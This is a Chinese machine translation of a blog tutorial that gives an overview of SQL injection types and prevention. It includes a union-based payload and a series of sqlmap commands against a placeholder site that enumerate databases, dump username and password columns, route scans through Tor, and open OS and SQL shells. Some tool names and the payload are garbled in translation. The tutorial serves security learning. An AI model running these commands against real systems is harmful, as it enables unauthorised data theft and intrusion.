<html>
<head>
<title>SQL Injection: An Overview</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">SQL注入:概述</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/sql-injection-an-overview-1057c5729dc5?source=collection_archive---------3-----------------------#2022-10-22">https://infosecwriteups.com/sql-injection-an-overview-1057c5729dc5?source=collection_archive---------3-----------------------#2022-10-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="657b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">作者= <a class="ae kl" href="https://www.instagram.com/_ansh_vyas/" rel="noopener ugc nofollow" target="_blank"> anshul vyas </a></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/081a7da45e859b7a334024a167fcc949.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*HyoCXVZrA6crdURqoRrGhQ.png"/></div></figure><h1 id="89f0" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">介绍</h1><p id="34f9" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">SQL是(结构查询语言)的缩写，是由IBM的研究人员Raymond Boyce和Donald Chamberlin在20世纪70年代开发的，这种语言是一种帮助管理数据库的后端语言，这种语言可以编辑数据库并进一步检索它，还可以更新、删除和创建新的数据库。数据以表、行和列的<br/>形式存储在数据库中</p><h1 id="4768" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">什么是SQL注入？</h1><p id="7c4e" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">SQL注入(也称为SQLi)这是一种特殊类型的注入攻击，有助于操纵SQL数据库来检索SQL数据库中存在的内容，而无需任何身份验证。如果一个成功的SQL注入是由一个个人或一个组织执行的，它可能会损害商誉，这对企业来说是非常糟糕的</p><h1 id="37cc" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">SQL注入怎么会害人？</h1><p id="8437" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">SQL注入是一个需要尽快修复的关键漏洞，它不仅损害了商誉，还损害了用户体验。它是一个如此关键的漏洞，以至于国家漏洞数据库给了它9.8(关键)分。任何黑客只需简单点击一下，就可以转储数据库中的所有内容</p><h1 id="f8a7" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">SQL注入的类型</h1><p id="c8d4" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">基本上有3种类型的SQL注入，再分为2类</p><h2 id="661b" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">1.带内SQLi</h2><p id="e7e8" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">这种类型的SQL注入是简单的类型和效率。这使得这成为最常见的攻击类型。这也分为两类:</p><ul class=""><li id="847a" class="mj mk iq jp b jq jr ju jv jy ml kc mm kg mn kk mo mp mq mr bi translated"><strong class="jp ir">基于错误的SQLi: </strong>在这种攻击中，攻击者故意产生一条错误消息，从这条消息中，攻击者可以收集有关web应用程序和数据库的信息</li><li id="278e" class="mj mk iq jp b jq ms ju mt jy mu kc mv kg mw kk mo mp mq mr bi translated"><strong class="jp ir">基于Union的SQLi: </strong>在这种攻击中，黑客利用Union运算符来利用漏洞。</li></ul><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="8753" class="lx kv iq my b gy nc nd l ne nf">Example — 'UNION SELECT * FROM users, communion SELECT * FROM users, courses</span></pre><p id="d4c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后作为HTTP响应的一部分返回。</p><h2 id="ba6e" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">2.推理SQLi</h2><p id="5e69" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">推理SQL注入，它不像其他SQL注入带内SQLi，也许需要更长的时间让恶意黑客利用，但是，它和任何其他形式的SQL注入一样危险</p><ul class=""><li id="f677" class="mj mk iq jp b jq jr ju jv jy ml kc mm kg mn kk mo mp mq mr bi translated"><strong class="jp ir">基于时间的SQLi: </strong>在这种情况下，攻击者向数据库发送一个SQL查询，让数据库等待一段时间(以秒为单位)，然后才响应查询的真假。</li><li id="6ba6" class="mj mk iq jp b jq ms ju mt jy mu kc mv kg mw kk mo mp mq mr bi translated"><strong class="jp ir"> Boolean SQLi: </strong>在这个攻击中，攻击者向数据库发送一个SQL查询，同时让应用程序通过生成是真还是假的结果来做出响应。</li></ul><h2 id="e110" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">3.带外SQLi</h2><p id="7cd7" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">这种类型的攻击在以下两种情况下执行:攻击者无法使用相同的媒介来发起攻击和收集信息，或者服务器非常落后或不稳定，无法执行这些特定类型的操作。</p><h1 id="327d" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">如何开发SQL注入？</h1><p id="fbd1" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">了解SQL注入的最佳方式是通过portswigger实验室<br/>利用SQL注入的最佳工具是通过一些渗透测试工具，如</p><ol class=""><li id="4ded" class="mj mk iq jp b jq jr ju jv jy ml kc mm kg mn kk ng mp mq mr bi translated">SQL映射</li><li id="ad25" class="mj mk iq jp b jq ms ju mt jy mu kc mv kg mw kk ng mp mq mr bi translated">硬石膏</li><li id="19d0" class="mj mk iq jp b jq ms ju mt jy mu kc mv kg mw kk ng mp mq mr bi translated">JSQLMAP</li><li id="edcd" class="mj mk iq jp b jq ms ju mt jy mu kc mv kg mw kk ng mp mq mr bi translated">QSCANNER</li><li id="a2b2" class="mj mk iq jp b jq ms ju mt jy mu kc mv kg mw kk ng mp mq mr bi translated">BBQSQL</li></ol><p id="86ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里我打算通过SQL MAP来解释一下。你可以从https://github.com/sqlmapproject/sqlmap.git安装SQL MAP。但是它是预先安装在Kali linux中的</p><h2 id="722a" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">简易扫描选项</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="ee9d" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php"</span></pre><h2 id="f67c" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">使用tor扫描</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="d202" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5</span></pre><h2 id="f3fe" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">通过手动设置返回时间进行扫描</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="8917" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php" --time-sec 15</span></pre><h2 id="1971" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">列出站点上的所有数据库</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="ab8d" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php" --dbs</span></pre><h2 id="b4a5" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">列出特定数据库中的所有表</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="7e4d" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php" -D site_db --tables</span></pre><h2 id="21fa" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">转储数据库表的内容</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="284b" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump</span></pre><h2 id="b795" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">列出表格中的所有列</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="1389" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns</span></pre><h2 id="4ba2" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">仅转储选定的列</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="8c80" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump</span></pre><h2 id="0229" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">当拥有管理员凭据时，我们可以转储数据库</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="f3c5" class="lx kv iq my b gy nc nd l ne nf">sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&amp;password=admin&amp;submit=Submit" -D social_mccodes -T users –dump</span></pre><h2 id="fb7c" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">获取操作系统外壳</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="4007" class="lx kv iq my b gy nc nd l ne nf">sqlmap --dbms=mysql -u "http://testsite.com/login.php" --os-shell</span></pre><h2 id="3716" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">获取SQL Shell</h2><pre class="kn ko kp kq gt mx my mz na aw nb bi"><span id="f729" class="lx kv iq my b gy nc nd l ne nf">sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell</span></pre><h1 id="da41" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">SQL注入预防</h1><ol class=""><li id="b14e" class="mj mk iq jp b jq ls ju lt jy nh kc ni kg nj kk ng mp mq mr bi translated">连续扫描和渗透测试</li><li id="95c2" class="mj mk iq jp b jq ms ju mt jy mu kc mv kg mw kk ng mp mq mr bi translated">限制数据库的权限</li><li id="6408" class="mj mk iq jp b jq ms ju mt jy mu kc mv kg mw kk ng mp mq mr bi translated">使用查询参数</li></ol></div><div class="ab cl nk nl hu nm" role="separator"><span class="nn bw bk no np nq"/><span class="nn bw bk no np nq"/><span class="nn bw bk no np"/></div><div class="ij ik il im in"><h2 id="17b4" class="lx kv iq bd kw ly lz dn la ma mb dp le jy mc md li kc me mf lm kg mg mh lq mi bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kl" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>，以5篇文章、4条线索、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>